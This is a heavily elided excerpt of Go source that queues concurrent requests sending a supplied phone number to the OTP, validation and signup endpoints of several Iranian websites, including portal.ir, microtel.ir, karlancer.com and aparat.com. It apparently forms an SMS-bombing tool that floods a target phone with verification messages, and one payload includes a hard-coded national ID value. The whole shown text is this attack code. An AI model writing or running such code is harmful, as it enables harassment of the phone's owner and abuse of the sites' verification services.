...
tasks <- func(c *http.Client) func() {
    return func() {
        ...
        sendJSONRequest(c, ctx, "https://www.portal.ir/site/api/v1/user/validate", payload, &wg, ch)
    }
}(client)
...
tasks <- func(c *http.Client) func() {
    return func() {
        ...
        sendJSONRequest(c, ctx, "https://www.portal.ir/site/api/v1/user/otp", payload, &wg, ch)
    }
}(client)
...
tasks <- func(c *http.Client) func() {
    return func() {
        ...
        sendJSONRequest(c, ctx, "https://microtel.ir/site/api/v1/user/validate", payload, &wg, ch)
    }
}(client)

// ۲. mapping/countries (GET)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        sendGETRequest(c, ctx, "https://microtel.ir/site/api/v1/mapping/countries", &wg, ch)
    }
}(client)
...
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            ...
            "mobile": phone,
            "name": "tplinkmodem",
            "national_code": "1092587584",
            "referrer": "گوگل",
        }
        sendJSONRequest(c, ctx, "https://microtel.ir/site/api/v1/user/otp", payload, &wg, ch)
    }
}(client)
...
tasks <- func(c *http.Client) func() {
    return func() {
        ...
        sendJSONRequest(c, ctx, "https://www.karlancer.com/api/register", payload, &wg, ch)
    }
}(client)
...
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("callbackType", "postmessage")
        formData.Set("origin", "https://www.aparat.com")
        formData.Set("account", phone)
        sendFormRequest(c, ctx, "https://www.aparat.com/api/fa/v1/user/Authenticate/signup_step1?callbackType=postmessage&origin=https%3A%2F%2Fwww.aparat.com", formData, &wg, ch)
    }
}(client)
